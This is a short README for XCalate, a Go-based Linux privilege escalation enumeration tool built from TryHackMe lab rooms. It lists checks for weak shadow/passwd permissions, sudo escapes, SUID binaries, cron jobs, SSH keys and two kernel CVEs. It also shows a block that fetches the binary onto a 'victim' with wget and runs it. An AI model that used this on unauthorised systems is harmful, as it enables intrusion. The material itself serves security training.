# XCalate
A privilege escalation tools based on TryHackMe.

Run simple check (not thorough) for possible vector of privilege escalation.

# Installation

>Tested with go version go1.24.0
1. `git clone https://github.com/7imbitz/XCalate.git`
2. `cd XCalate`

## Build
3. Send `uname -m` command inside target
|`uname -m`| Meaning | `GOARCH`|
|---|---|---|
|x86_64, amd64|64-bit Intel/AMD| `amd64`|
|i686, i386|32-bit x86|`386`|
|aarch64|64-bit ARM|`arm64`|
|armv7l, armv6l|32-bit ARM|`arm`|
4. Example - `env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o XCalate cmd/main.go`
5. Transfer the binary to the victim machine

```bash
#host
sudo python3 -m http.server 80 
#victim
wget 10.10.10.10/XCalate 
chmod +x XCalate
./XCalate
```

# Reference

- https://tryhackme.com/r/room/linuxprivesc
    - https://tryhackme.com/7imbitz/badges/linux-privesc     
- https://tryhackme.com/r/room/windows10privesc

# Checklist

In the meantime it checks for 
- Linux
    - ✅ Possible Service Exploits
    - ✅ Weak File Permissions
        - ✅ /etc/shadow - Readable & Writable
        - ✅ /etc/passwd - Writable
    - ✅ Sudo - Shell Escape Sequences
    - ✅ SUID Executable
    - ✅ Cron Jobs
        - ✅ Overwrite custom cronjob - Writable
        - ✅ Check user's path inside the file
        - ✅ Usage of wildcards in cronjob
    - ✅ History
    - ✅ .ssh
    - ✅ kernel check for 
        - ✅ CVE-2021-3493
        - ✅ CVE-2022-0847
        - To be added

- Window
    - To be continued...
